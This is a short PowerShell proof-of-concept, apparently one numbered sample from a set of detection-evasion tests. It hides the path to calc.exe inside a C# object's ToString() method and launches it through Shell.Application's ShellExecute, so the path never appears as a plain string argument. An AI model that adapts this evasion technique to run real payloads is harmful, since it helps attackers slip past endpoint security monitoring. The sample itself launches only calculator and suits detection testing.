Add-Type -TypeDefinition @"
public class Evade24 {
    public override string ToString() {
        return "C:\\Windows\\System32\\calc.exe";
    }
}
"@
$evade = New-Object Evade24
$shell = New-Object -ComObject "Shell.Application"
$shell.ShellExecute($evade, "", "", "", 1)
